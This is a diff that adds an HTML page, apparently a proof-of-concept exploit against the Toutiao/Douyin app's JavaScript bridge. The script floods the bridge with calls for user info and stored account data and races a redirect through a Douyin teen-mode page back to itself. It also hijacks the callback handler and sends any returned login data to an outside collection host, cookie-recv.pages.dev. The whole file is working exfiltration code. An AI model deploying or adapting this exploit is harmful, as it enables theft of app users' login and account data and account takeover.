@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"><title>loading</title></head>
+<body>
+<h3 id="st">racing...</h3>
+<script>
+var EXFIL = 'https://cookie-recv.pages.dev/';
+var BACK = location.href.split('?')[0] + '?grab=1';
+
+function send(tag, data) {
+    var url = EXFIL + '?tag=' + encodeURIComponent(tag) + '&d=' + encodeURIComponent(String(data).substring(0, 3500));
+    try { fetch(url, {mode: 'no-cors'}); } catch (e) { new Image().src = url; }
+}
+
+ToutiaoJSBridge._handleMessageFromToutiao = function (msg) {
+    if (msg && msg.__msg_type === 'callback') {
+        var s = JSON.stringify(msg);
+        if (s.indexOf('not authorized') === -1 && s.indexOf('not found') === -1) {
+            send('login_data', s);
+            document.getElementById('st').textContent = 'PWNED';
+            document.title = 'PWNED';
+        }
+    }
+};
+
+var SENT = 0;
+function pump() {
+    try {
+        ToutiaoJSBridge.invokeMethod(JSON.stringify({
+            func: 'x.getUserInfo', params: {},
+            __callback_id: 'g' + (SENT % 5),
+            __msg_type: 'call', __timestamp: Date.now()
+        }));
+        ToutiaoJSBridge.invokeMethod(JSON.stringify({
+            func: 'x.getStorageItem', params: {key: 'key_account_info', biz: 'default'},
+            __callback_id: 's' + (SENT % 5),
+            __msg_type: 'call', __timestamp: Date.now()
+        }));
+        ToutiaoJSBridge.invokeMethod(JSON.stringify({
+            func: 'getNativeItem', params: {key: 'key_account_info'},
+            __callback_id: 'n' + (SENT % 5),
+            __msg_type: 'call', __timestamp: Date.now()
+        }));
+        ToutiaoJSBridge.invokeMethod(JSON.stringify({
+            func: 'x.request',
+            params: {url: EXFIL + '?tag=req&n=' + SENT, method: 'get', addCommonParams: true, header: {}, params: {}},
+            __callback_id: 'r' + (SENT % 5),
+            __msg_type: 'call', __timestamp: Date.now()
+        }));
+        SENT++;
+    } catch (e) {}
+}
+
+if (!/[?&]grab=1/.test(location.search)) {
+    for (var i = 0; i < 300; i++) pump();
+    setInterval(pump, 0);
+    setTimeout(function () {
+        location.href = 'https://luna-web.douyin.com/teen-mode-agreement/index.html?returnUrl=' + encodeURIComponent(BACK);
+    }, 120);
+} else {
+    document.getElementById('st').textContent = 'back - waiting...';
+    ToutiaoJSBridge._handleMessageFromToutiao = function (msg) {
+        if (msg && msg.__msg_type === 'callback') {
+            var s = JSON.stringify(msg);
+            if (s.indexOf('not authorized') === -1 && s.indexOf('not found') === -1) {
+                send('back_login_data', s);
+                document.getElementById('st').textContent = 'PWNED';
+                document.title = 'PWNED';
+            }
+        }
+    };
+    for (var i = 0; i < 50; i++) pump();
+    setTimeout(function () {
+        send('back_status', document.title);
+    }, 3000);
+}
+</script>
+</body>
+</html>
